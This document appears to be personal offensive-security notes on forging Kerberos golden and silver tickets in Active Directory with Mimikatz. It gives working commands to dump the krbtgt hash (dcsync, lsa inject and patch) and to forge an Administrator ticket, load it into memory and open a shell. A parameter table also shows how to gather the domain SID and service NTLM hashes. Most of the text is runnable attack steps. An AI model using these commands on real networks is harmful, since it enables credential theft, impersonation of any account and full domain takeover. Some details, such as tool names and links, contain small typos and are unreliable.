A golden ticket is a TGT crafted with the KRBTGT AD serivce's password, using which you can imitate any account on the entire AD.
https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden
##### Requirements
Admin level access to any user on the AD

##### Dumping the krbtgt hash
Use Mimikatz to dump the hash:
```
./mimikatz.exe
privilege::debug  // If this returns anything but "Privilege '20' OK", Mimikatz has not been run as Admin.
lsadump::dcsync /user:krbtgt@DOMAIN  // Might throw an error, use the alternative version.
lsadump::lsa /inject /name:krbtgt  // If you have DC Privilege, use this. For silver ticket creation, change the name.
```
On the DC:
```
privilege::debug  // If this returns anything but "Privilege '20' OK", Mimikatz has not been run as Admin.
lsadump::lsa /patch
lsadump::lsa /inject /name:krbtgt  // If you have DC Privilege, use this. For silver ticket creation, change the name.
```


##### Forging a Golden ticket
```
Kerberos::golden /user:Administrator /domain:controller.local /sid:MIMIKATZ_OUTPUT_SID /krbtgt:KRBTGT_NTLM
```
Note: the Key Distribution Center (`KDC`) will only check if the  `/user` -specified value is correct if the ticket is less than 20 minutes old. So as long as the ticket is older than 20 minutes, the specified user does not even need to exist.
`/sid`: The domain's SID (obtain via mimikatz output, or by using `Get-LocalUser -name krbtgt | select sid` and removing the last identifier (RID))
`/krbtgt`: The KRBTGT service's NTLM hash.

The ticket will now be stored in the current directory as "ticker.kirbi".

##### Exploiting using the Golden ticket
Load the ticket into memory:
```
kerberos::ptt TICKET_FILE
```
On another command prompt, check using:
```
klist // If it has a TGT, it has succeeded.
```
If you have RDP, create a remote shell:
```
misc::cmd
```
Otherwise, you can access whatever machine you want to as the Administrator via normal CMD, as long as you have the TGT active.

#### Silver tickets
https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden
Silver tickets are generated the same way as golden tickets, but with a few extra parameters:

```
kerberos::golden /sid:DOMAIN_SID /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:TARGET_USER_NTLM /user:TARGET_USER
```


| Argument   | Description                                         | Example                                    | Command                                                          |
| ---------- | --------------------------------------------------- | ------------------------------------------ | ---------------------------------------------------------------- |
| `/sid`     | The domain SID (the user SID without the last part) | `S-1-5-21-1987370270-658905905-1781884369` | `whoami /user`                                                   |
| `/domain`  | The domain name                                     | `corp.com`                                 | `Get-Domain`                                                     |
| `/ptt`     | Enable passing the ticket                           |                                            |                                                                  |
| `/target`  | The full name of the target machine                 | `web04.corp.com`                           | `Get-NetUser -SPN \| select samaccountname,serviceprincipalname` |
| `/service` | The protocol of the SPN                             | `http`                                     | `Get-NetUser -SPN \| select samaccountname,serviceprincipalname` |
| `/rc4`     | The NTLM hash of the SPN                            | `4d28cf5252d39971419580a51484ca09`         | `sekursla::logonpasswords`                                       |
| `/user`    | The user, can be any.                               | `jeff`                                     | `Get-DomainUser`                                                 |
